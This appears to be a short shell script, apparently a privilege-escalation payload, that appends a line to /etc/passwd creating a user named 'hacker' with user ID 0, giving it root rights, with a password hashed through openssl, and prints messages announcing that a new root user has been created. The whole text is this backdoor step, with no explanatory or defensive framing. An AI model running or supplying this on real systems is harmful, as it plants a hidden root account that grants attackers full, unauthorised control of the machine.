echo "Creating new root user"
echo "hacker:$(openssl passwd mrcake):0:0:root:/root:/bin/bash" >> /etc/passwd;
echo "New root user has been created successfully"